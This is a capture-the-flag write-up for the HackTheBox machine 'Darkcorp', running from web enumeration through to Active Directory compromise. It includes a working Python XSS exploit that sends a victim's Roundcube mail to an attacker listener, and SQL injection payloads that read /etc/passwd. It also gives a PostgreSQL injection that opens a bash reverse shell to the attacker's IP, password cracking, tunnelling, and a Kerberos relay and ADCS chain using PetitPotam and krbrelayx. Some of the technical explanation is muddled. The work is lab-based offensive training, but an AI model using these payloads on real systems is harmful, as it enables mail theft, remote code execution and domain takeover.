---
title: HackTheBox - Darkcorp
date: 2025-10-18 02:30:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [roundcube-XSS, SQLinjection, smb relay, Dpapi]     
image : assets/images/93fba06a4780b65be5a5a4f9512b8e78.png
---
# Starting

### nmap

```bash
nmap -sC -sV -Pn 10.10.11.54 -vv
22/tcp open  ssh     syn-ack ttl 127 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPM91a70VJCxg10WFerhkQv207077raOCX9rTMPBeEbHqGHO954XaFtpqjoofHOQWi2syh7IoOV5+APBOoJ60k0=
|   256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHquJFnMIhX9y8Ea87tDtRWPtxThlpE2Y1WxGzsyvQQM
80/tcp open  http    syn-ack ttl 127 nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.22.1
|_http-title: Site doesn't have a title (text/html).
```

## Web Server

we have web server on port 80

![alt text](../assets/images/darkcorp1.png)

Lets check `subdomains` maybe we can find roundcube with it.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://drip.htb/ -H "Host: FUZZ.drip.htb" -fs 64

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://drip.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.drip.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 64
________________________________________________

mail                    [Status: 200, Size: 5323, Words: 366, Lines: 97, Duration: 218ms]
```

Lets add on /etc/hosts file and check it whats going on here.

![alt text](../assets/images/darkcorp2.png)

we dont have any creds yet but lets see if we can create `http://drip.htb/register` 

![alt text](../assets/images/darkcorp3.png)

and login on mail

![alt text](../assets/images/ezgif-1942a1fa95e73b.gif)


and now lets check which version we have on roundcube.

![alt text](../assets/images/darkcorp4.png)

at least we grab a username and message.

```bash
Welcome to DripMail! We’re excited to provide you convenient email solutions!. If you need help, please reach out to us at support@drip.htb.
```

### Roundcube Webmail 1.6.7

and now check for rouncube mail version number.

![alt text](../assets/images/darkcorp5.png)

and look for **Roundcube Webmail 1.6.7** exploit;

![alt text](../assets/images/darkcorp6.png)

its seems like XSS is the way but its says;

`allows a remote attacker to steal and send emails of a victim via a crafted e-mail message that abuses a Desanitization issue in message_body() in program/actions/mail/show.php.`

So its seems like we will steal a mail for information.

https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/

```bash
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin) foo=bar">
  Foo
</body>
```

this should be our payload!!!

I listened everything from [`http://drip.htb/](http://drip.htb/index#contact)contact`  and found this!!!

![alt text](../assets/images/ezgif-1efd2a0e8a6bd8.gif)


we have target & payload so i created basic python command do this for us;

```python
#!/usr/bin/env python3
import argparse
import base64
import logging
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
from urllib.parse import urlparse, parse_qs, unquote

import requests
from lxml import html

# ---------- Config / CLI ----------
parser = argparse.ArgumentParser(description="Exploit POST + exfil listener (cleaned-up)")
parser.add_argument("--target", default="http://drip.htb/contact", help="Target URL for POST")
parser.add_argument("--listen-ip", default="0.0.0.0", help="IP to listen on")
parser.add_argument("--listen-port", default=7777, type=int, help="Port to listen on")
parser.add_argument("--exfil-host", default="10.10.14.11", help="Host that receives exfil callback")
parser.add_argument("--exfil-port", default=7777, type=int, help="Port used in exfil callback URL")
parser.add_argument("--debug", action="store_true", help="Enable debug logging")
args = parser.parse_args()

if args.debug:
    logging.basicConfig(level=logging.DEBUG, format="%(asctime)s [%(levelname)s] %(message)s")
else:
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

# ---------- Payload pieces (same logic as your original) ----------
start_mesg = '<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch(\'/?_task=mail&_action=show&_uid='
message = 3
end_mesg = '&_mbox=INBOX&_extwin=1\').then(r=>r.text()).then(t=>fetch(`http://{}:{}/c=${{btoa(t)}}`)) foo=bar">Foo</body>'.format(
    args.exfil_host, args.exfil_port
)

post_data = {
    "name": "miao",
    "email": "miao",
    "message": f"{start_mesg}{message}{end_mesg}",
    "content": "html",
    "recipient": "bcase@drip.htb",
}

headers = {
    "Host": "drip.htb",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://drip.htb",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": "http://drip.htb/index",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    # keep the cookie you provided originally
    "Cookie": "session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiOGI3NjgwNjMxNjU3YmEwNzlkM2RhNTNiMmY3ODcwN2ZjNTc3MWE1MyJ9.aPK2Ow.D6gdjFWOjD8SePFrA9oNerHdWVI",
    "Connection": "close",
}

logging.info("Final message payload (preview):\n%s", f"{start_mesg}{message}{end_mesg}")

# ---------- HTTP Server to capture exfil ----------
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

class ExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Example path: /c=<base64payload>
        parsed = urlparse(self.path)
        path = parsed.path
        query = parsed.query

        # Try to extract payload from path first (/c=...)
        encoded = None
        if "/c=" in path:
            encoded = path.split("/c=")[1]
        else:
            # maybe sent as query parameter ?c=<payload>
            qs = parse_qs(query)
            if "c" in qs:
                encoded = qs["c"][0]

        if encoded:
            # percent-decoding if needed
            encoded = unquote(encoded)
            # handle URL-safe base64 and padding
            try:
                # add missing padding
                padding = "=" * (-len(encoded) % 4)
                b = base64.b64decode(encoded + padding)
                decoded = b.decode("latin-1", errors="replace")
                logging.info("[+] Received encoded payload (%d bytes)", len(b))
                # parse html
                tree = html.fromstring(decoded)
                message_nodes = tree.xpath('//div[@id="messagebody"]')
                if message_nodes:
                    message_text = message_nodes[0].text_content().strip()
                    logging.info("[+] Extracted Message Body:\n%s", message_text)
                else:
                    logging.warning("[!] No div with id 'messagebody' found in decoded HTML.")
                    # optional: print decoded HTML for debugging
                    logging.debug("Decoded HTML:\n%s", decoded)
            except Exception as e:
                logging.exception("Failed to decode or parse payload: %s", e)
        else:
            logging.debug("[!] GET received but no /c= payload found: %s", self.path)

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        # suppress default access logs (we use logging module)
        logging.debug(format % args)

def start_server(listen_ip: str, listen_port: int, stop_event: threading.Event):
    server = ThreadedHTTPServer((listen_ip, listen_port), ExfilHandler)
    logging.info("[+] Listening on %s:%d for exfiltrated data...", listen_ip, listen_port)
    # run server until stop_event is set
    while not stop_event.is_set():
        server.handle_request()
    logging.info("[+] Server stopping.")

# ---------- Send the POST ----------
def send_post(target_url: str, data: dict, headers: dict):
    s = requests.Session()
    try:
        logging.info("[*] Sending POST to %s ...", target_url)
        r = s.post(target_url, data=data, headers=headers, timeout=10, allow_redirects=True, verify=False)
        logging.info("[+] POST sent, status_code=%s", r.status_code)
    except requests.RequestException as e:
        logging.exception("POST failed: %s", e)

if __name__ == "__main__":
    stop_evt = threading.Event()
    server_thread = threading.Thread(
        target=start_server, args=(args.listen_ip, args.listen_port, stop_evt), daemon=True
    )
    server_thread.start()

    try:
        send_post(args.target, post_data, headers)
        # keep running until Ctrl+C
        logging.info("Press Ctrl+C to stop the listener and exit.")
        while True:
            stop_evt.wait(timeout=1)
    except KeyboardInterrupt:
        logging.info("Keyboard interrupt received, shutting down...")
        stop_evt.set()
        # give server thread a moment to exit gracefully
        server_thread.join(timeout=2)
        logging.info("Done.")

```

U have to change  `Cookie': 'session=` and ur `IP-Adress`

```bash
python3 xss_mail.py
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch('/?_task=mail&_action=show&_uid=3&_mbox=INBOX&_extwin=1').then(r=>r.text()).then(t=>fetch(`http://10.10.14.11:7777/c=${btoa(t)}`)) foo=bar">Foo</body>
[+] Listening on port 7777 for exfiltrated data...
[+] POST Request Sent! Status Code: 200
[+] Extracted Message Body Content:

Hey Bryce,

The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.

You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.

If you encounter any issues or have feedback, let me know so I can address them promptly.

Thanks
```

we got new host `dev-a3f1-01.drip.htb`  and lets check on it!!

![alt text](../assets/images/ezgif-49aa3f0325953f.gif)


we need steal token here for user

```python
flask-unsign --sign --cookie "{'_fresh': True, '_id': '1863a91a5d6c18713e8e9cf245ef9359d2585c5c198fcfba3ac8e75005786627ce980850b3e84e17f2d76f2ca5c00464fc0c4138c802bd5e38533c5ff6975df5', '_user_id': '1', 'csrf_token': 'lmao'}" --secret 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
.eJwtjrsOwyAMAP-FuYONMZj8TESMrVZ9RCLpVPXfy9DxTjrpPmH1Ycc1LOd42yWstx6WgJKpVWzcs6IUJBOr6jGxeSWuPbKwsmIVV98aNRUrDMBFco5FrQoIwzbDZFg89pI9amMFSDm5giYkUYG4dTYSJlJ2z7Vwdw5z5H3Y-N9M1GP4eu53e03xeLY9fH9xnzVv.aPK9eg.E5oKGCPQruDlxBZxkF3tcA3eXWs
```
![alt text](../assets/images/ezgif-47f8e5965d9718.gif)


and we are in lets check what we can do now!! For trigger `search` tab i used `'`  and i got this.

### SQL Injection

![alt text](../assets/images/darkcorp7.png)

lets try with something easier `' UNION SELECT version()--`

![alt text](../assets/images/darkcorp8.png)

| **Test** | **Payload** | **Success Indicators** |
| --- | --- | --- |
| **Boolean Blind** | `' AND 1=1--` | Normal page |
|  | `' AND 1=2--` | Error/different page |
| **Error Based** | `'/(SELECT * FROM users)--` | Error reveals data |
| **Time Based** | `'; SELECT pg_sleep(10)--` | 10s delay |
| **UNION** | `' UNION SELECT NULL,NULL--` | Count columns |
| **Out of Band** | Use `dnslog.co` + `(SELECT extractvalue(1,concat(0x7e,(SELECT database()),0x7e)))` | DNS lookup |

potential payloads

```bash
9. ' UNION SELECT username,password FROM users--
10. ' UNION SELECT * FROM users ORDER BY 1--
11. '; SELECT pg_sleep(5)--     # Time-based blind
12. ' OR 1=1; SELECT version()-- # Stacked queries
```

we can verify with `'osman'; SELECT version()--`

![alt text](../assets/images/darkcorp9.png)

my payloads will be;

```bash
'osman'; SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'--
```

![alt text](../assets/images/darkcorp10.png)

but i was not able to read then with basic payloads like

```bash
'osman'; SELECT * FROM Admins LIMIT 3--
'osman'; SELECT * FROM Users LIMIT 5--
```

so i will change my attack aim. since we are working on psql from Linux i tried to read `/etc/passwd`

```bash
'osman'; SELECT pg_read_file('/etc/passwd')--
```

![alt text](../assets/images/darkcorp11.png)

and for RCE payload

### First shell

```bash
'';DO $$ DECLARE c text; BEGIN c := CHR(67)||CHR(79)||CHR(80)||CHR(89)||' (SELECT '''') to program ''bash -c "sudo -l; bash -i >& /dev/tcp/10.10.14.11/4444 0>&1"'''; EXECUTE c; END $$;
```

and grab shell

```bash
➜  darkcorp nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.54] 63806
bash: cannot set terminal process group (25302): Inappropriate ioctl for device
bash: no job control in this shell
postgres@drip:/var/lib/postgresql/15/main$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ain$ python3 -c 'import pty;pty.spawn("/bin/bash")'
epostgres@drip:/var/lib/postgresql/15/main$ 

postgres@drip:/var/lib/postgresql/15/main$ export TERM=xterm
export TERM=xterm
postgres@drip:/var/lib/postgresql/15/main$ ^Z
[1]  + 171845 suspended  nc -lnvp 4444
➜  darkcorp sttt -raw echo;fg
zsh: command not found: sttt
[1]  + 171845 continued  nc -lnvp 4444

postgres@drip:/var/lib/postgresql/15/main$ id
id
uid=102(postgres) gid=110(postgres) groups=110(postgres),109(ssl-cert)
```

### ssh enum

I found something interesting but permission denied for now.

![alt text](../assets/images/darkcorp12.png)

i upload [`https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS`](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) and run it for find something interesting

![alt text](../assets/images/darkcorp13.png)

 it will be our next target i think!! and also found this `/var/www/html/dashboard/apps/.env`

```bash
╔══════════╣ Analyzing Env Files (limit 70)
-rw-r--r-- 1 root root 796 Jan 15  2025 /var/www/html/dashboard/apps/.env                                                              
DEBUG=False
FLASK_APP=run.py
FLASK_ENV=development
ASSETS_ROOT=/static/assets
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432
SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
-rw-r--r-- 1 root root 796 Jan 15  2025 /var/www/html/dashboard/.env
DEBUG=False
FLASK_APP=run.py
FLASK_ENV=development
ASSETS_ROOT=/static/assets
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432
SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
-rw-r--r-- 1 root root 796 Jan 15  2025 /var/www/html/dripmail/apps/.env
DEBUG=False
FLASK_APP=run.py
FLASK_ENV=development
ASSETS_ROOT=/static/assets
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432
SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
-rw-r--r-- 1 root root 796 Jan 15  2025 /var/www/html/dripmail/.env
DEBUG=False
FLASK_APP=run.py
FLASK_ENV=development
ASSETS_ROOT=/static/assets
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432
SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
```

okey found something interesting but we will try later lets enum linpeas 

![alt text](../assets/images/darkcorp14.png)

lets see if we can decyrpt em cause we got shell as postgresql and its seems like really interesting

```bash
postgres@drip:/var/backups/postgres$ ls
ls
dev-dripmail.old.sql.gpg
```

this one worked

```bash
gpg --homedir /var/lib/postgresql/.gnupg --pinentry-mode=loopback --passphrase '2Qa2SsBkQvsc' --decrypt dev-dripmail.old.sql.gpg > dev-dripmail.old.sql
```

because we found password before on linpeas output from `.env` files. u can just read it directly and

```bash
COPY public."Admins" (id, username, password, email) FROM stdin;
1   bcase   dc5484871bc95c4eab58032884be7225        bcase@drip.htb
2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb
```

and somes are crackable

| dc5484871bc95c4eab58032884be7225 | Unknown | Not found. |
| --- | --- | --- |
| cac1c7b0e7008d67b6db40c03e76b9c0 | md5 | victor1gustavo@# |
| 8bbd7f88841b4223ae63c8848969be86 | md5 | ThePlague61780 |

So our new creds i think ebelford `ThePlague61780` and victor.r : `victor1gustavo@#`;

Bom!!!

```bash
➜  darkcorp nxc ssh drip.htb -u ebelford -p 'ThePlague61780'
SSH         10.10.11.54     22     drip.htb         [*] SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3
SSH         10.10.11.54     22     drip.htb         [+] ebelford:ThePlague61780  Linux - Shell access!
```

we can directly access with ebelford on ssh

# Darkcorp.htb (domain)

### First proxy

i will put proxy with

```bash
sshuttle -r ebelford@drip.htb 172.16.20.3/24
```

and here is why

![alt text](../assets/images/darkcorp15.png)

Lets enum our new target!!!

```bash
➜  darkcorp nxc smb 172.16.20.3/24
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:False)
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
```

but for find all hosts

```bash
ebelford@drip:~$ for i in {1..255}; do ping -c 1 172.16.20.$i >/dev/null;if [ $? -eq 0 ]; then echo 172.16.20.$i;fi;done
172.16.20.1
172.16.20.2
172.16.20.3
```

now u can see difference there is also `172.16.20.3` 

Lets now start `nmap` scan

```bash
ebelford@drip:/tmp$ ./nmap 172.16.20.3/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-10-17 18:34 MDT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for DC-01 (172.16.20.1)
Host is up (0.0011s latency).
Not shown: 1144 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
443/tcp open  https
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps

Nmap scan report for 172.16.20.2
Host is up (0.00075s latency).
Not shown: 1152 closed ports
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  epmap
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
5000/tcp open  unknown

Nmap scan report for drip.darkcorp.htb (172.16.20.3)
Host is up (0.000073s latency).
Not shown: 1154 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

172.16.20.3 is just our first target tho `drip.htb` but we found really interesting

`5000/tcp open  unknown` and lets check whats going on there.

![alt text](../assets/images/darkcorp16.png)

its required cred lets try all creds we found before

![alt text](../assets/images/darkcorp17.png)

and its work for port 5000 `victor.r : victor1gustavo@#` 

Yeah but we have to analyze it on Burp Suite right? for authentcation it we will use.

![alt text](../assets/images/darkcorp19.png)

and we are in!!! `http://172.16.20.2:5000/check` was really interesting.

![alt text](../assets/images/darkcorp20.png)

Its seems like interesting but before realize our attack i wanna enum our target more

### Darkcorp.htb enum

Lets start with check smb 

```bash
nxc smb 172.16.20.1 -u victor.r -p 'victor1gustavo@#'        
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
```

we can use `--users` for grab usernames and check description maybe we can find something interesting.

```bash
nxc smb 172.16.20.1 -u victor.r -p 'victor1gustavo@#' --users
```

![alt text](../assets/images/darkcorp21.png)

at least we have username list. lets check shares

```bash
nxc smb 172.16.20.1 -u victor.r -p 'victor1gustavo@#' --shares
```

![alt text](../assets/images/darkcorp22.png)

`CertEnroll` is really interesting and its remind me ADCS lets check on adcs

First off all we have access on `LDAP`

```bash
nxc ldap DC-01.darkcorp.htb -u victor.r -p 'victor1gustavo@#'                               
LDAP        172.16.20.1     389    DC-01            [*] Windows Server 2022 Build 20348 (name:DC-01) (domain:darkcorp.htb)
LDAP        172.16.20.1     389    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
```

since we have ldap access lets dump BH data!!!

```bash
sudo dnschef --fakeip 172.16.20.1 --fakedomains darkcorp.htb -q

bloodhound-python -u 'victor.r' -d darkcorp.htb -p 'victor1gustavo@#' -ns 127.0.0.1 --disable-pooling --zip -c all,loggedon --dns-timeout 50 -dc DC-01.darkcorp.htb
```

![alt text](../assets/images/darkcorp23.png)

and upload it.

![alt text](../assets/images/darkcorp24.png)

nothing interesting yet. lets come back at `ADCS`

```bash
nxc smb dc-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' -M enum_ca
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)                                                                                                                   
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
ENUM_CA     172.16.20.1     445    DC-01            Active Directory Certificate Services Found.
ENUM_CA     172.16.20.1     445    DC-01            http://172.16.20.1/certsrv/certfnsh.asp
```

this is interesting!!!

![alt text](../assets/images/ezgif-5fc2a50a465ee7.gif)



Now i make sure something about `Relay`
But!!!!! 

We cannot put port 80 and 443 cause its required sudo privielges!!!!

i put my Bloodhound on port 8080!!!!

and put my FoxyProxy on 8081!!!! so i will put it on my 8082 or 8083!! with chisel;

```bash
./chisel_linux server -p 8888 --reverse

./chisel_linux client 10.10.14.11:8888 8083:10.10.14.11:80
```

![alt text](../assets/images/darkcorp25.png)

okey nice now everything on `drip.darkcorp.htb:8083` will come out our `10.10.14.11:80`

![alt text](../assets/images/ezgif-5aaa1c82a98d2e.gif)

and finally i got something i got something
![alt text](../assets/images/ezgif-594e437cd86081.gif)

we are getting here interactive shell as svc_acc!!!!

![alt text](../assets/images/darkcorp25.png)

nice!!!!

## DNSAdmins Privilege Abuse: Kerberos Relay → Machine Account Takeover

**Initial Discovery: SVC_ACC's Elevated Privileges**

During our enumeration of domain group memberships, we identified that the **`SVC_ACC`** service account holds membership in the **`DNSAdmins`** security group:

```
[+] SVC_ACC Membership: DNSAdmins, ServiceAccounts
```

**DNSAdmins** is a **privileged domain group** that grants **full administrative control** over **Windows DNS Server** configurations within the Active Directory environment. Specifically, it enables:

| **DNSAdmins Capability** | **Technical Impact** | **Attack Vector** |
| --- | --- | --- |
| **Zone Creation/Deletion** | `Add-DnsServerPrimaryZone` / `Remove-DnsServerZone` | Pivot zones to attacker-controlled DNS |
| **Resource Record Management** | `Add-DnsServerResourceRecordA` / `Set-DnsServerResourceRecord` | **DNS marshaling attacks** (Kerberos coercion) |
| **TXT Record Injection** | Custom TXT payloads | **AP_REQ relay payloads** for Kerberos abuse |
| **NS Record Hijacking** | `Set-DnsServerNsRecord` | **Domain-wide DNS poisoning** |

This capability transforms **`SVC_ACC`** from a standard service account into a **DNS manipulation primitive**, opening pathways to **advanced Kerberos delegation attacks**.

**Attack Vector: Kerberos Relay via DNS Marshaling**

Leveraging **`DNSAdmins`** privileges, we executed a **Kerberos Relay Attack** - a sophisticated technique that **intercepts and forwards** Kerberos **`AP_REQ`** (authentication request) messages between services.

**Core Concept:**

- **Step 1:** Coerce target machine (`WEB-01$`) to authenticate to **our controlled DNS server**
- **Step 2:** Capture the `AP_REQ` ticket during DNS resolution
- **Step 3:** **Relay** the ticket to **ADCS Certificate Services** (`certsrv`)
- **Result:** **Certificate issuance** for `WEB-01$` **without direct access**

**Preconditions Met:**

- **No Signing/Encryption:** `WEB-01` has **LDAP signing disabled** (`HKLM\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters\\RequireSignOrSeal = 0`)
- **ADCS Exposed:** `https://dc-01.darkcorp.htb/certsrv/` accepting **unauthenticated enrollment**
- **DNSAdmins Access:** `SVC_ACC` can inject malicious DNS records

**Detailed Technical Flow:**

```
[WEB-01] --AP_REQ--> [Our DNS Server] --RELAY--> [ADCS certsrv]
                           |                        |
                      Capture Ticket          Issues Cert
                           |                        |
                      WEB-01$ TGT <------------- Valid for 10h

```

**Reference:** [Black Hills Infosec - "DNS-Marshalling for Relaying to AD CS"](https://www.blackhillsinfosec.com/dns-marshalling-for-relaying-to-ad-cs/) provides the **canonical implementation** and deep-dive into the **GSS-API tunneling** mechanics.

**Execution: Certificate Enrollment via Relayed AP_REQ**

**Target Endpoint Configuration**

```
Target: <https://dc-01.darkcorp.htb/certsrv/certfnsh.asp>
Method: POST (PKI Enrollment)
Purpose: Request **Machine Template** certificate for WEB-01$

```

**Relay Destination:** When `WEB-01$` resolves our malicious DNS entry, its Kerberos `AP_REQ` is **transparently forwarded** to ADCS, triggering **automatic certificate issuance** under the `Machine` template.

**Malicious DNS Record Construction**

To **force Kerberos authentication** (bypassing NTLM fallback), we crafted a **marshalled DNS TXT record** containing an **empty `CREDENTIAL_TARGET_INFORMATIONW`** structure - the **minimal valid GSS-API wrapper** for Kerberos delegation.

**Base Marshalled Payload**

```
1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

**Breakdown:**

- `1UWhRC...` = **GSS-API Header** (Kerberos OID + flags)
- `AAAAAAAAAAAAAAAA...` = **Empty credential structure** (0-byte padding)
- `YBAAAA` = **Trailer** (length + null terminator)

**Length:** **44 bytes** - **shortest valid** across all Windows domains

### **Full DNS Record (Domain Controller Target)**

```
_dc-01.darkcorp.htb. IN TXT "DC-01.darkcorp.htb1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA"
```

**Construction Process:**

1. **Prepend Target:** `DC-01.darkcorp.htb` (FQDN of relay destination)
2. **Append Marshalled:** `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`
3. **Inject via DNSAdmins:** Creates **coercion trigger**

**Resulting Record:**

```bash
dig _dc-01.darkcorp.htb TXT
_dc-01.darkcorp.htb. 300 IN TXT "DC-01.darkcorp.htb1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA"
```

while doing this dont forget!!!!!

```bash
nxc smb dc-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' -M enum_ca
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
ENUM_CA     172.16.20.1     445    DC-01            Active Directory Certificate Services Found.
ENUM_CA     172.16.20.1     445    DC-01            http://172.16.20.1/certsrv/certfnsh.asp
```

First of all lets start with add dnsrecord

```bash
sudo ntlmrelayx.py -t ldap://172.16.20.1 -smb2support --no-dump --no-da --no-acl --no-validate-privs --add-dns-record 'DC-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' '10.10.14.11'
```
![alt text](../assets/images/ezgif-5e6e08f9c361ae.gif)

**WHEN ITS DONE DOWN NTLMRELAY AND RUN KRBRELAY NOW** !!!!

https://github.com/dirkjanm/krbrelayx

```bash
python3 krbrelayx.py -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' --adcs -v 'WEB01$'
```

and now run petiptpotam

https://github.com/topotam/PetitPotam

```bash
python3 PetitPotam.py -u victor.r -p 'victor1gustavo@#' -d darkcorp.htb 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' web-01
```

![alt text](../assets/images/darkcorp27.png)

and we can auth this pfx directly!!!

```bash
certipy-ad auth -pfx WEB01\$.pfx -dc-ip 172.16.20.1
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'WEB-01.darkcorp.htb'
[*]     Security Extension SID: 'S-1-5-21-3432610366-2163336488-3604236847-20601'
